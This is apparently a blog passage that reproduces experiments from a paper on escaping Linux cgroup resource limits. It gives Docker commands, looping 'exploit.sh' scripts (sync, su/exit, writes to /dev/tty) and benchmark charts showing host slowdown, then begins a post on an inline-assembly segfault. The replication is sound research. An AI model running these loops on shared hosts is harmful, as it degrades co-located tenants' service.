<h4 id="Resource-Freeing-Attack"><a href="#Resource-Freeing-Attack" class="headerlink" title="Resource-Freeing Attack"></a>Resource-Freeing Attack</h4><p>2 个 container run 在 同一个 cpu core，因此会 compete for cpu resource (cpu share is same as default 1024)</p>
<p>victim container - file copy</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /apt/file-cp.sh </span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">curl https://www.cc98.org &gt; 0.txt</span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">	cp 0.txt 1.txt</span><br><span class="line">done</span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"0"</span> -v /home/zty/dev/tianyu-ubuntu/apt:/apt -it --rm tianyu/ubuntu:v2.1	<span class="comment"># v2.1 installs curl</span></span></span><br></pre></td></tr></table></figure>

<p>malicious container - sync shell &amp; sysbench</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat exploit.sh </span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">	sync</span><br><span class="line">done</span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"0"</span> -v /home/zty/dev/cfile:/cfile -it --rm tianyu/ubuntu:v1 <span class="comment"># v1 installs sysbench</span></span></span><br></pre></td></tr></table></figure>

<p>baseline data</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">in</span> malicious container</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cpu benchmark</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sysbench --<span class="built_in">test</span>=cpu --cpu-max-prime=20000 run</span></span><br><span class="line">	events per second:   619.61</span><br><span class="line"><span class="meta">#</span><span class="bash"> memory benchmark</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sysbench --<span class="built_in">test</span>=cpu --cpu-max-prime=20000 run</span></span><br><span class="line">	6203.23 MiB/sec</span><br></pre></td></tr></table></figure>

<p>normal case (run on the same core)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">in</span> malicious container</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cpu benchmark</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sysbench --<span class="built_in">test</span>=cpu --cpu-max-prime=20000 run</span></span><br><span class="line">	events per second:   308.21</span><br><span class="line"><span class="meta">$</span><span class="bash"> sysbench --<span class="built_in">test</span>=cpu --cpu-max-prime=20000 run</span></span><br><span class="line">	3105.56 MiB/sec</span><br></pre></td></tr></table></figure>

<p>attack case</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">in</span> malicious container</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> exploit use sync</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> /cfile/exploit.sh &amp;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cpu benchmark</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sysbench --<span class="built_in">test</span>=cpu --cpu-max-prime=20000 run</span></span><br><span class="line">	events per second:   526.24</span><br><span class="line"><span class="meta">$</span><span class="bash"> sysbench --<span class="built_in">test</span>=cpu --cpu-max-prime=20000 run</span></span><br><span class="line">	5413.83 MiB/sec</span><br></pre></td></tr></table></figure>

<h5 id="Graph-2"><a href="#Graph-2" class="headerlink" title="Graph"></a>Graph</h5><p>汇总之后如下图所示</p>
<div id="container4" style="weight:100%; height: 600px"></div>
<script type="text/javascript">
var dom = document.getElementById("container4");
var myChart = echarts.init(dom);
var app = {};
option = {
    tooltip: {
        trigger: 'axis',
        axisPointer: {
            type: 'cross',
            crossStyle: {
                color: '#999'
            }
        }
    },
    legend: {
        data:['CPU','Memory']
    },
    xAxis: [
        {
            type: 'category',
            data: ['baseline','normal','attack'],
            axisPointer: {
                type: 'shadow'
            }
        }
    ],
    yAxis: [
        {
            type: 'value',
            name: 'events per second',
            min: 0,
            max: 700,
            interval: 100
        },
        {
            type: 'value',
            name: 'MiB/s',
            min: 0,
            max: 7000,
            interval: 1000
        }
    ],
    series: [
        {
            name:'CPU',
            label: {
                normal: {
                    show: 'true',
                    position: 'top'
                }
            },
            type:'bar',
            barWidth: '40',
            data:[619.61, 308.21, 526.24]
        },
        {
            name:'Memory',
            type:'bar',
            yAxisIndex: 1,
            label: {
                normal: {
                    show: 'true',
                    position: 'top'
                }
            },
            barWidth: '40',
            data:[6203.23, 3105.26, 5413.83]
        }
    ]
};
;
if (option && typeof option === "object") {
    myChart.setOption(option, true);
}
</script>

<h3 id="Case-3-System-Process-Journald"><a href="#Case-3-System-Process-Journald" class="headerlink" title="Case 3: System Process - Journald"></a>Case 3: System Process - Journald</h3><ul>
<li><p>2 containers in <strong>different cores</strong> of the host</p>
</li>
<li><p>maclicious container: keep switching user and quit current user</p>
</li>
<li><p>victim container: run fio benchmark and unixbench same as case 2</p>
</li>
</ul>
<h4 id="data-clloect"><a href="#data-clloect" class="headerlink" title="data clloect"></a>data clloect</h4><p>Dockerfile</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat Dockerfile</span></span><br><span class="line">FROM ubuntu</span><br><span class="line">MAINTAINER Tianyu &lt;lufeihaizei2008@gmail.com&gt;</span><br><span class="line">COPY ./apt /apt-info</span><br><span class="line">RUN cp /apt-info/sources.list /etc/apt/</span><br><span class="line">RUN apt-get update</span><br><span class="line">RUN yes | apt-get install make gcc perl</span><br><span class="line"><span class="meta">$</span><span class="bash"> docker build -t tianyu/ubuntu:v2 .</span></span><br></pre></td></tr></table></figure>

<p><strong>make sure you have installed <code>perl</code>, otherwise you will get trouble while running unixbench for it is using perl to do test.</strong></p>
<p>base line</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"0"</span> -v /home/zty/dev/byte-unixbench/:/unix-bench -v /home/zty/dev/fio:/fio --rm -it tianyu/ubuntu:v2</span></span><br><span class="line">root@2b6136c7c609:/# cd unix-bench/UnixBench</span><br><span class="line">root@2b6136c7c609:/unix-bench/UnixBench# ./Run execl fsdisk pipe spawn shell1</span><br><span class="line">System Benchmarks Partial Index              BASELINE       RESULT    INDEX</span><br><span class="line">Execl Throughput                                 43.0       6594.4   1533.6</span><br><span class="line">File Copy 4096 bufsize 8000 maxblocks          5800.0    2629512.0   4533.6</span><br><span class="line">Pipe Throughput                               12440.0    1035165.1    832.1</span><br><span class="line">Process Creation                                126.0      15519.4   1231.7</span><br><span class="line">Shell Scripts (1 concurrent)                     42.4      13463.1   3175.3</span><br><span class="line"></span><br><span class="line">root@2b6136c7c609:/# cd /fio/</span><br><span class="line">root@2b6136c7c609:/fio# make install</span><br><span class="line">root@2b6136c7c609:/fio# cd /</span><br><span class="line">root@2b6136c7c609:/# mkdir data</span><br><span class="line">root@2b6136c7c609:/# fio -directory=/data/ -name=tempfile.dat -direct=1 -rw=read -bs=4k -size=10M -numjobs=16 -runtime=30 -group_reporting</span><br><span class="line">   bw (  KiB/s): min=26101, max=50756, per=99.72%, avg=40570.14, stdev=499.94, samples=117</span><br><span class="line">   iops        : min= 6525, max=12688, avg=10142.25, stdev=124.97, samples=117</span><br><span class="line">   </span><br><span class="line">root@2b6136c7c609:/# fio -directory=/data/ -name=tempfile.dat -direct=1 -rw=write -bs=4k -size=10M -numjobs=16 -runtime=30 -group_reporting</span><br><span class="line">   bw (  KiB/s): min= 4368, max=22178, per=100.00%, avg=15815.60, stdev=314.15, samples=320</span><br><span class="line">   iops        : min= 1092, max= 5544, avg=3953.65, stdev=78.54, samples=320</span><br><span class="line">   </span><br><span class="line">root@2b6136c7c609:/# fio -directory=/data/ -name=tempfile.dat -direct=1 -rw=randread -bs=4k -size=10M -numjobs=16 -runtime=30 -group_reporting</span><br><span class="line">   bw (  KiB/s): min=  390, max= 3534, per=100.00%, avg=1687.47, stdev=42.64, samples=958</span><br><span class="line">   iops        : min=   96, max=  882, avg=421.07, stdev=10.66, samples=958</span><br><span class="line">   </span><br><span class="line">root@2b6136c7c609:/# fio -directory=/data/ -name=tempfile.dat -direct=1 -rw=randwrite -bs=4k -size=10M -numjobs=16 -runtime=30 -group_reporting</span><br><span class="line">   bw (  KiB/s): min=  166, max= 2080, per=99.95%, avg=1230.35, stdev=23.00, samples=960</span><br><span class="line">   iops        : min=   40, max=  520, avg=306.95, stdev= 5.76, samples=960</span><br></pre></td></tr></table></figure>

<p><strong>attack</strong></p>
<p>malicious container</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"5"</span> -v /home/zty/dev/cfile:/cfile -it --rm ubuntu</span></span><br><span class="line">root@8ebbb7f63f8e:/# useradd james</span><br><span class="line">root@8ebbb7f63f8e:/# cat /cfile/su-user.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">  exit | su james</span><br><span class="line">done</span><br><span class="line">root@8ebbb7f63f8e:/# /cfile/su-user.sh</span><br></pre></td></tr></table></figure>

<p>victim container - as benchmark like above</p>
<p>-------------- this is out of date</p>
<p><strong>su operation in container cannot trigger journald in the Host</strong></p>
<p>文中提及的操作并不能调用 Host 的 jounald 操作，因此不能 exploit</p>
<p>下文是在 malicious container 循环 su/exit 操作时，在 host 上查看的 journald cpu 使用情况</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -ax | grep jour</span></span><br><span class="line">  396 ?        S&lt;s    0:16 /lib/systemd/systemd-journald</span><br><span class="line"><span class="meta">$</span><span class="bash"> top -p 396</span></span><br><span class="line">top - 14:04:44 up 22:26,  1 user,  load average: 1.85, 2.23, 1.94</span><br><span class="line">Tasks:   1 total,   0 running,   1 sleeping,   0 stopped,   0 zombie</span><br><span class="line"><span class="meta">%</span><span class="bash">Cpu(s):  3.4 us,  5.1 sy,  0.0 ni, 89.8 id,  0.0 wa,  0.0 hi,  1.6 si,  0.0 st</span></span><br><span class="line">KiB Mem : 16212392 total,  9236540 free,  3412200 used,  3563652 buff/cache</span><br><span class="line">KiB Swap:  2097148 total,  1858556 free,   238592 used. 12361432 avail Mem </span><br><span class="line"></span><br><span class="line">  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                  </span><br><span class="line">  396 root      19  -1  175656  78124  70184 S   0.0  0.5   0:16.16 systemd-journal</span><br></pre></td></tr></table></figure>

<p>---------------- 2019.11.12</p>
<p>After receiving the email of the author, I realize that I don&#39;t have installed an important application called <code>auditd</code>.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install auditd</span></span><br></pre></td></tr></table></figure>

<p>Do above command to install  <code>auditd</code>, then you will observe the utilization increase of <code>journald</code>, <code>auditd</code> and <code>kaouditd</code> after keeping changing user inside the container.</p>
<h4 id="result"><a href="#result" class="headerlink" title="result"></a>result</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo iotop -oP</span></span><br></pre></td></tr></table></figure>

<p>This command can observe the processes which are doing I/O operations. More info please consider <code>man iotop</code>.</p>
<p>Unixbench </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">System Benchmarks Partial Index              BASELINE       RESULT    INDEX</span><br><span class="line">Execl Throughput                                 43.0       6063.9   1410.2</span><br><span class="line">File Copy 4096 bufsize 8000 maxblocks          5800.0    2317441.3   3995.6</span><br><span class="line">Process Creation                                126.0      14555.2   1155.2</span><br><span class="line">Shell Scripts (1 concurrent)                     42.4      12276.8   2895.5</span><br></pre></td></tr></table></figure>

<p><strong>fio benchmark</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>bw average</th>
<th>iops average</th>
</tr>
</thead>
<tbody><tr>
<td>Read</td>
<td>6642.58/40570.14</td>
<td>1659.94/10142.25</td>
</tr>
<tr>
<td>Write</td>
<td>943.68/15815.60</td>
<td>235.38/3953.65</td>
</tr>
<tr>
<td>Rand_read</td>
<td>1067.48/1687.47</td>
<td>266.28/421.07</td>
</tr>
<tr>
<td>Rand_write</td>
<td>666.47/1230.35</td>
<td>166.04/306.95</td>
</tr>
</tbody></table>
<div id="container-case3" style="weight:100%; height: 600px"></div>
<script type="text/javascript">
var dom = document.getElementById("container-case3");
var myChart = echarts.init(dom);
var app = {};
option = {
    title: {
        text: 'performance degradation',
        subtext: '占 baseline 数据的比例'
    },
    tooltip: {
        trigger: 'axis',
        axisPointer: {
            type: 'shadow'
        }
    },
    grid: {
        left: '3%',
        right: '4%',
        bottom: '3%',
        containLabel: true
    },
    xAxis: {
        type: 'value',
        boundaryGap: [0, 0.01]
    },
    yAxis: {
        type: 'category',
        data: ['seq_read', 'seq_write', 'rand_read', 'rand_write', 'shell script', 'excel throughput', 'file copy', 'process creation']
    },
    series: [
        {
            color: '#2f4554',
            label: {
                show: 'true',
                position: 'right',
                fontSize: '14'
            },
            barWidth: '35',
            type: 'bar',
            data: [16.37, 5.96, 63.25, 54.16, 91.18, 91.95, 88.13, 93.78]
        }
    ]
};
;
if (option && typeof option === "object") {
    myChart.setOption(option, true);
}
</script>



<h3 id="Case-4-Container-Engine"><a href="#Case-4-Container-Engine" class="headerlink" title="Case 4: Container Engine"></a>Case 4: Container Engine</h3><blockquote>
<p>It is fairly easy to exploit the container engine to break thecontrol of cgroups. One simple approach is to exploit the terminal subsystem. </p>
<p>When a container user interacts with the tty device, the data first passes through the CLI process and the container daemon,and reaches the tty driver for further processing. Specifically, the data is sent to the LDISC, which connects the high-level generic interface (e.g., read, write, ioctl) and low-level device driver in the terminal system. The data is flushed to LDISC by executing workqueues in the kworker kernel threads. </p>
<p>As a result, all workloads onthe kernel threads and all container engine processes will not becharged to the container instances.</p>
</blockquote>
<p>简而言之，在 container 内部往 /dev/tty 输入信息，这些信息就会从 container 传递到 container daemon 然后增加 docker，dockerd 还有 kworker 等一系列的进程/线程的工作量。</p>
<p>那么只要<strong>循环的在 container 内部向 /dev/tty 传递信息</strong>，就会持续 generate wordloads 到 Host 上的一系列进程当中。</p>
<p>这里<span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81Y2YyNTFkNzUxODgyNTY2ZDkyNjliYjM=" title="https://juejin.im/post/5cf251d751882566d9269bb3">介绍几个命令<i class="fa fa-external-link"></i></span></p>
<ul>
<li><code>systemd-cgls</code> 查看 cgroup 信息，返回系统的整体 cgroup 层级</li>
<li><code>systemd-cgtop</code> 查看 cgroup 层级的动态信息，只显示开启资源统计功能的 sevice 和 slice，可以手动添加新的</li>
</ul>
<p>在论文中看到监控资源占用的一共有这几个部分</p>
<ul>
<li>container</li>
<li>docker</li>
<li>dockerd</li>
<li>child processes</li>
<li>dockerd</li>
<li>rest</li>
</ul>
<p>我在 Host 上查找了相关的 processes( with the container already running)，找到以下几个</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -ax | grep <span class="string">"docker\|container"</span></span></span><br><span class="line"> 1535 ?        Ssl    0:16 /usr/bin/containerd</span><br><span class="line"> 1755 ?        Ssl   12:31 /usr/bin/dockerd</span><br><span class="line">26519 pts/0    Sl+    1:33 docker</span><br><span class="line">26545 ?        Sl     3:06 containerd-shim</span><br></pre></td></tr></table></figure>

<p>@@ <strong>containerd-shim 就是运行的容器</strong> @@</p>
<p>上面这句话是错误的，参见<span class="exturl" data-url="aHR0cDovL2FsZXhhbmRlci5ob2xicmVpY2gub3JnL2RvY2tlci1jb21wb25lbnRzLWV4cGxhaW5lZC8=" title="http://alexander.holbreich.org/docker-components-explained/">这个网站<i class="fa fa-external-link"></i></span>，<strong>containerd-shim 是由 containerd 创建的服务 container 的进程</strong>，一个 container 对应一个 containers-shim。</p>
<p>而论文当中指的 child processes 不知道具体指什么，另外在 container 执行以下脚本之后</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /cfile/exploit.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">	echo aaa &gt; /dev/tty</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>Host 上的 top 结果如下所示（只节选了需要参考的数据和属性列）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">  PID USER        %CPU   %MEM     TIME+ COMMAND</span><br><span class="line"> 1475 root        161.5   0.6   2:45.41 dockerd                             </span><br><span class="line">18404 root        111.0   0.0   0:09.90 containerd-shim                     </span><br><span class="line">18529 root        99.7    0.0   0:08.89 exploit.sh                          </span><br><span class="line">18374 zty         54.5    0.4   0:04.86 docker                              </span><br><span class="line">17507 zty         40.5    0.0   0:03.97 sshd                                </span><br><span class="line">17399 root        11.0    0.0   0:01.00 kworker/u24:1-e                     </span><br><span class="line">17823 root        10.6    0.0   0:00.50 kworker/u24:2-e                     </span><br><span class="line">12171 root        10.0    0.0   0:02.70 kworker/u24:0+e                     </span><br><span class="line">18516 zty         1.0     0.3   0:00.11 chrome                              </span><br><span class="line"> 3270 zty         0.7     1.6  11:19.42 gnome-shell                         </span><br><span class="line">    9 root        0.3     0.0   0:00.20 ksoftirqd/0                         </span><br><span class="line">13879 root        0.3     0.0   0:01.57 kworker/u24:4-e                     </span><br><span class="line">    1 root        0.0     0.1   0:05.53 systemd</span><br></pre></td></tr></table></figure>

<p>docker stats 的结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NAME                CPU %               PIDS</span><br><span class="line">nice_goldberg       104.57%             2</span><br></pre></td></tr></table></figure>

<p>dockerd 的 cpu 占用和论文中 dockerd + child process 的 cpu 占用差不多，具体论文中是如何区分 dockerd 和它的 child process 的，我并不知道，而且根据论文中所述</p>
<blockquote>
<p>The dockerd process has multiple child processes foreach container instance. Those processes are attached to the defaultcgroupfor all system services.</p>
</blockquote>
<p>但我用 <code>pgrep -P {dockerd pid}</code> 时并没有找到相应的 child process，不知是否是作者的理解出问题还是我没有找到。</p>
<h4 id="Graph-3"><a href="#Graph-3" class="headerlink" title="Graph"></a>Graph</h4><p>最后我总结数据为如下图表所示</p>
<div id="container5" style="weight:100%; height: 600px"></div>
<script type="text/javascript">
var dom = document.getElementById("container5");
var myChart = echarts.init(dom);
var app = {};
option = null;
option = {
    tooltip: {
        trigger: 'item',
        formatter: "{a} <br/>{b}: {c}%"
    },
    legend: {
        orient: 'vertical',
        x: 'left',
        data:['docker','container','dockerd','kworker','containerd-shim']
    },
    series: [
        {
            name:'process on host',
            type:'pie',
            radius: ['40%', '80%'],
            avoidLabelOverlap: false,
            label: {
                show: true,
                position: 'inside',
                color: '#fff',
                fontSize: 18,
                fontWeight: 'bolder',
                formatter: '{c}%',
            },
            data:[
                {value:54.5, name:'docker'},
                {value:104.57, name:'container'},
                {value:161.5, name:'dockerd'},
                {value:31.6, name:'kworker'},
                {value:111.0, name:'containerd-shim'}
            ],
            itemStyle: {
                emphasis: {
                    shadowBlur: 10,
                    shadowOffsetX: 0,
                    shadowColor: 'rgba(0, 0, 0, 0.5)'
                }
            }
        }
    ],
    graphic: {
        type: 'text',
        z: 100,
        left: 'center',
        top: 'middle',
        style: {
            fill: '#333',
            text: [
                'Total:',
                ' ',
                '463.17%'
            ].join('\n'),
            fontWeight: 'bolder',
            fontSize: 26
        }
    }
};
;
if (option && typeof option === "object") {
    myChart.setOption(option, true);
}
</script>

<h3 id="Case-5-Softirq-Handling"><a href="#Case-5-Softirq-Handling" class="headerlink" title="Case 5:  Softirq Handling"></a>Case 5:  Softirq Handling</h3><p>这个 case 主要针对的是 <em>softirqd</em> 和 <em>interrupt context</em>，分别利用 NET softirq 和 BLOCK softirq 来 generate workloads 到 Host 上去。</p>
<p>从文章的分析上看，NET softirq 手段在 Local testbed 上表现还可以，在 iptable rules 达到 10w 的时候，最多可以消耗 Host 50% 的 cpu 资源，然而由于目前缺乏关于 iptable rules 的相关知识，同时也没法按照实验里说的那样制造大量的 network traffic，因为 paper 对这个 case 的描述不多。</p>
<p>因此在这里只尝试 BLOCK softirq 的攻击手段，对于前者，我建立了一个 github issue，留待今后有需要的时候更新，有兴趣的同学也可以尝试。</p>
<h4 id="BLOCK-softirq"><a href="#BLOCK-softirq" class="headerlink" title="BLOCK softirq"></a>BLOCK softirq</h4><p>先准备新的 image，这次需要 sysbench 和 fio 两个 benchmark tool，因此过程如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat Dockerfile </span></span><br><span class="line">FROM ubuntu</span><br><span class="line">MAINTAINER Tianyu &lt;lufeihaizei2008@gmail.com&gt;</span><br><span class="line">COPY ./apt /apt-info</span><br><span class="line">RUN cp /apt-info/sources.list /etc/apt/</span><br><span class="line">RUN apt-get update</span><br><span class="line">RUN yes | apt-get install sysbench make gcc</span><br><span class="line"><span class="meta">$</span><span class="bash"> docker build -t tianyu/ubuntu</span></span><br><span class="line">tianyu/ubuntu       tianyu/ubuntu:v1    tianyu/ubuntu:v2    tianyu/ubuntu:v2.1</span><br><span class="line"><span class="meta">$</span><span class="bash"> docker build -t tianyu/ubuntu:v5 .</span></span><br></pre></td></tr></table></figure>

<p>然后启动 container 做一些初始化工作，注意需要限制在一个 cpu core 上</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"0"</span> -v /home/zty/dev/fio:/fio --rm -it tianyu/ubuntu:v5</span></span><br><span class="line">root@cfe09f72208c:/# cd /fio</span><br><span class="line">root@cfe09f72208c:/fio# ./configure</span><br><span class="line">root@cfe09f72208c:/fio# make</span><br><span class="line">root@cfe09f72208c:/fio# make install</span><br><span class="line">root@cfe09f72208c:/fio# fio --version</span><br><span class="line">fio-3.16</span><br><span class="line">root@cfe09f72208c:/fio# sysbench --version</span><br><span class="line">sysbench 1.0.11</span><br><span class="line">root@cfe09f72208c:/fio# fio -directory=/data/ -ioengine=sync -name=tempfile.dat -direct=1 -rw=read -bs=4k -size=10M -numjobs=16 -runtime=100 -group_reporting</span><br></pre></td></tr></table></figure>





<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[^note1]:  cgroup man page: <span class="exturl" data-url="aHR0cDovL21hbjcub3JnL2xpbnV4L21hbi1wYWdlcy9tYW43L2Nncm91cHMuNy5odG1s" title="http://man7.org/linux/man-pages/man7/cgroups.7.html">http://man7.org/linux/man-pages/man7/cgroups.7.html<i class="fa fa-external-link"></i></span>.</p>
<p>[^note2]: Gao, Xing, et al. &quot;Houdini’s Escape: Breaking the Resource Rein of Linux Control Groups.&quot; (2019).<br>[^note3]: The 26th ACM Conference on Computer and Communications Security in <strong>London, United Kingdom from November 11 to November 15, 2019</strong>.</p>
<p>[^note4]: Docker installation and configuration: <a href="https://tianyuzhou.top/wiki/docker-install/">https://tianyuzhou.top/wiki/docker-install/</a>.<br>[^note5]:Docker official Documentation of docker run command:  <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL3JlZmVyZW5jZS9jb21tYW5kbGluZS9ydW4v" title="https://docs.docker.com/engine/reference/commandline/run/">https://docs.docker.com/engine/reference/commandline/run/<i class="fa fa-external-link"></i></span>.<br>[^note6]: Docker container cpu period constaint: <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL3JlZmVyZW5jZS9ydW4vI2NwdS1wZXJpb2QtY29uc3RyYWludA==" title="https://docs.docker.com/engine/reference/run/#cpu-period-constraint">https://docs.docker.com/engine/reference/run/#cpu-period-constraint<i class="fa fa-external-link"></i></span>.</p>
]]></content>
      <categories>
        <category>Linux Kernel</category>
      </categories>
      <tags>
        <tag>cgroup</tag>
        <tag>Docker</tag>
        <tag>Linux container</tag>
      </tags>
  </entry>
  <entry>
    <title>x86 inline assemble Core dumped in Linux-5.0</title>
    <url>/2019/10/16/x86-inline-assemble/</url>
    <content><![CDATA[<p>C++ 内联汇编时碰到 core dump 之后的原因分析。</p>
<a id="more"></a>

<h2 id="x86-内联汇编-Core-Dumped"><a href="#x86-内联汇编-Core-Dumped" class="headerlink" title="x86 内联汇编 Core Dumped"></a>x86 内联汇编 Core Dumped</h2><p>Written by Tianyu</p>
<p>在做《庖丁解牛Linux内核分析》第 4.3 节实验<a href="”实验楼“参考信息：https://www.shiyanlou.com/courses/195/learning/.">^note1</a> 的时候，有关于 c++ 内联汇编的代码，同时这段汇编代码要求用 <code>gcc -m32</code> 来编译，即跨平台编译，用这种方式编译的可执行文件，运行的结果是 <code>core dumped</code>。代码如下所示</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">time_t</span> tt; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">t</span>;</span> </span><br><span class="line">    <span class="comment">// tt = time(NULL);</span></span><br><span class="line">    __asm__ __volatile__ (</span><br><span class="line">            <span class="string">"mov $0,%%ebx\n\t"</span></span><br><span class="line">            <span class="string">"mov $0xd,%%eax\n\t"</span></span><br><span class="line">            <span class="string">"int $0x80\n\t"</span></span><br><span class="line">            <span class="string">"mov %%eax,%0\n\t"</span></span><br><span class="line">            :<span class="string">"=m"</span>(tt)</span><br><span class="line">            :</span><br><span class="line">            );</span><br><span class="line">    t = localtime(&amp;tt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"time: %d : %d : %d : %d : %d : %d\n"</span>, t-&gt;tm_year, t-&gt;tm_mon, t-&gt;tm_mday, t-&gt;tm_hour, t-&gt;tm_min, t-&gt;tm_sec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逻辑很简单，获取系统时间，调用 <code>localtime()</code> 获取格式化的时间信息，然后输出。代码中利用 <code>__asm __volatile__ ()</code> 来实现内联汇编，这段汇编的作用如它上方的那段注释所示，就是调用第 13 号系统调用，并将返回值放到 <code>tt</code> 变量当中。</p>
<p>然而编译并运行这段代码的结果如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在运行 gcc -m32 之前需要确保安装了 gcc-multilib</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gcc -m32 -o time-asm time-asm.c</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./time-asm </span></span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>



<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>首先是系统的一些信息</p>
<ul>
<li>Operating System：Ubuntu 18.04.1</li>
<li>Kernel Version: Linux 5.0.0-31-generic</li>
<li>Machine: x86_64</li>
</ul>
<p>然后是遇到问题的具体描述</p>
<blockquote>
<p>在进行 c 语言内联汇编的时候，用 <code>gcc -m32</code> 进行跨平台编译，得到的可执行文件无法运行，会得到 <code>Segmentation fault (core dumped)</code></p>
</blockquote>
<h3 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h3><p>我和我的同事 <strong>Simon</strong>[^note2] 探讨了这个问题，他碰到过类似的情况，那个是在操作系统实验当中，由于 gcc 的版本问题，导致编译出的可执行文件无法正常运行。</p>
<p>于是我查看了 gcc 的版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc -v</span></span><br><span class="line">gcc version 8.3.0</span><br></pre></td></tr></table></figure>

<p>已经是最新的版本了。</p>
<p>接着我考虑用 gdb 去调试一下程序，看看到底是在哪一步出错了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc -m32 -g -o time-asm time-asm.c</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gdb time-asm</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>在这里可能会遇到一个问题，就是如果 gdb 和 gcc 的版本不匹配，那么会导致代码连 main() 函数都无法运行到。</p>
</blockquote>
<p><strong>对于这种情况，请读者自行配置匹配的 gcc, g++, gdb。我配置的是 gcc/g++ 8.3.0, gdb 8.3。</strong></p>
<p>接下来进行调试</p>
